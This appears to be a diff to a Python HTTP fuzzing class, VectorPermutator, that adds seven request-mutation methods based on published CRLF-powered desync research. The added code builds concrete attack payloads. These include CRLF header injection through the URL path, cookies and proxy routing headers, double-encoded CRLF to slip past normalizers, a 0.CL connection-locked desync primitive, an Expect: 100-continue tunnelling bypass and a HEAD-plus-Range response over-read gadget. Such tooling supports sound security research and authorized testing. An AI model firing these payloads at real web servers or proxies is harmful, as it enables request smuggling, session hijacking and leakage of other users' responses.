@@ -109,8 +109,20 @@ class VectorPermutator:
 
         return variants
 
+    def get_crlf_desync_mutators(self) -> List[Any]:
+        """Returns the specialized catalog of 7 CRLF Request Header Injection & Desync mutators (Tom Stacey research)."""
+        return [
+            self._mutate_crlf_path_rhi,
+            self._mutate_crlf_cookie_rhi,
+            self._mutate_crlf_routing_headers,
+            self._mutate_crlf_double_url_encoding,
+            self._mutate_crlf_0_cl_connection_lock,
+            self._mutate_crlf_expect_100_tunnel,
+            self._mutate_head_range_gadget,
+        ]
+
     def get_terminator_mutators(self) -> List[Any]:
-        """Returns the complete catalog of 25 protocol terminator & framing mutators."""
+        """Returns the complete catalog of 32 protocol terminator, framing & CRLF-RHI mutators."""
         return [
             self._mutate_path_nul,
             self._mutate_path_asterisk_gadget,
@@ -137,6 +149,14 @@ class VectorPermutator:
             self._mutate_early_hints_103_expect_terminator,
             self._mutate_capsule_datagram_terminator,
             self._mutate_iso8859_nel_separator_terminator,
+            # CRLF-Powered Desync Mutators (Tom Stacey / PortSwigger Research)
+            self._mutate_crlf_path_rhi,
+            self._mutate_crlf_cookie_rhi,
+            self._mutate_crlf_routing_headers,
+            self._mutate_crlf_double_url_encoding,
+            self._mutate_crlf_0_cl_connection_lock,
+            self._mutate_crlf_expect_100_tunnel,
+            self._mutate_head_range_gadget,
         ]
 
     def combine_triggers(self, probe_a: Dict[str, Any], probe_b: Dict[str, Any]) -> Optional[Dict[str, Any]]:
@@ -403,4 +423,94 @@ class VectorPermutator:
             nel_insert = "X-NEL-Term: line1\x85X-RS-Term: line2\x1e\r\n"
             return req.replace("\r\n\r\n", f"\r\n{nel_insert}\r\n", 1), "dirty_nel_record_separator_terminator"
         return req, ""
+
+    def _mutate_crlf_path_rhi(self, req: str) -> Tuple[str, str]:
+        """
+        Injects request headers into the URL path, exploiting Nginx $uri proxy_pass decoding
+        (Tom Stacey & Tobia Righi research: 'CRLF-Powered Desync Attacks: Beheading HTTP Streams').
+        """
+        pattern = re.compile(r"^(GET|POST|HEAD|PUT|DELETE)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
+        if pattern.search(req):
+            injected_path = "/%20HTTP/1.1%0d%0aHost:%20target.local%0d%0aTransfer-Encoding:%20chunked%0d%0aFoo:%20bar"
+            mutated = pattern.sub(rf"\1 {injected_path} \2", req, count=1)
+            return mutated, "crlf_path_request_header_injection"
+        return req, ""
+
+    def _mutate_crlf_cookie_rhi(self, req: str) -> Tuple[str, str]:
+        """Injects CRLF sequences and framing headers via Cookie values to bypass path sanitizers."""
+        if "\r\n\r\n" in req:
+            if "Cookie:" in req:
+                mutated = re.sub(
+                    r"(Cookie:[^\r\n]*)",
+                    r"\1%0d%0aTransfer-Encoding:%20chunked%0d%0aX-Canary:%201",
+                    req,
+                    count=1,
+                )
+                return mutated, "crlf_cookie_request_header_injection"
+            cookie_insert = "Cookie: session=abc%0d%0aTransfer-Encoding:%20chunked%0d%0aX-Canary:%201\r\n"
+            return req.replace("\r\n\r\n", f"\r\n{cookie_insert}\r\n", 1), "crlf_cookie_request_header_injection"
+        return req, ""
+
+    def _mutate_crlf_routing_headers(self, req: str) -> Tuple[str, str]:
+        """Injects CRLF sequences into reverse proxy routing headers (X-Original-Url, X-Rewrite-URL)."""
+        if "\r\n\r\n" in req and "X-Original-Url:" not in req:
+            routing_insert = (
+                "X-Original-Url: /%0d%0aExpect:%20asdf%0d%0aX-Injected:%201\r\n"
+                "X-Rewrite-URL: /%0d%0aTransfer-Encoding:%20chunked\r\n"
+            )
+            return req.replace("\r\n\r\n", f"\r\n{routing_insert}\r\n", 1), "crlf_routing_header_injection"
+        return req, ""
+
+    def _mutate_crlf_double_url_encoding(self, req: str) -> Tuple[str, str]:
+        """Applies double-URL-encoded CRLF (%250d%250a) to bypass multi-layer gateway normalizers."""
+        pattern = re.compile(r"^(GET|POST|HEAD)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
+        if pattern.search(req):
+            double_encoded = "/%2520HTTP/1.1%250d%250aExpect:%2520asdf%250d%250aX:%25201"
+            mutated = pattern.sub(rf"\1 {double_encoded} \2", req, count=1)
+            return mutated, "crlf_double_url_encoded_rhi"
+        return req, ""
+
+    def _mutate_crlf_0_cl_connection_lock(self, req: str) -> Tuple[str, str]:
+        """
+        Transforms GET request into 0.CL desync primitive via CRLF path injection.
+        Key weapon for browser-powered connection-locked and IP-locked desync attacks.
+        """
+        pattern = re.compile(r"^(GET|HEAD)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
+        if pattern.search(req):
+            injected_0cl = "/images/%20HTTP/1.1%0d%0aContent-Length:%2045%0d%0aX:%20x"
+            mutated = pattern.sub(rf"\1 {injected_0cl} \2", req, count=1)
+            return mutated, "crlf_0_cl_connection_locked_desync"
+        return req, ""
+
+    def _mutate_crlf_expect_100_tunnel(self, req: str) -> Tuple[str, str]:
+        """
+        Injects Expect: 100-continue via CRLF path to force reverse proxies (Nginx)
+        into unbuffered bidirectional tunneling mode, bypassing header stripping.
+        """
+        pattern = re.compile(r"^(GET|POST)\s+/\s+(HTTP/1\.[01])", re.MULTILINE)
+        if pattern.search(req):
+            injected_expect = "/%20HTTP/1.1%0d%0aExpect:%20100-continue%0d%0aHost:%20target.local"
+            mutated = pattern.sub(rf"\1 {injected_expect} \2", req, count=1)
+            return mutated, "crlf_expect_100_tunneling_bypass"
+        return req, ""
+
+    def _mutate_head_range_gadget(self, req: str) -> Tuple[str, str]:
+        """
+        The Ultimate Response Smuggling Gadget: Combines HEAD with Range: bytes=1-650
+        to over-read response queues by arbitrary lengths without requiring pre-existing fixed files.
+        """
+        lines = req.split("\r\n")
+        if lines:
+            first_line = lines[0]
+            if "HTTP/" in first_line:
+                # Replace method with HEAD
+                first_line = re.sub(r"^(GET|POST|PUT|DELETE)\b", "HEAD", first_line)
+                lines[0] = first_line
+                mutated_req = "\r\n".join(lines)
+                if "\r\n\r\n" in mutated_req and "Range:" not in mutated_req:
+                    range_hdr = "Range: bytes=1-650\r\n"
+                    mutated_req = mutated_req.replace("\r\n\r\n", f"\r\n{range_hdr}\r\n", 1)
+                return mutated_req, "head_range_arbitrary_overread_gadget"
+        return req, ""
+
 
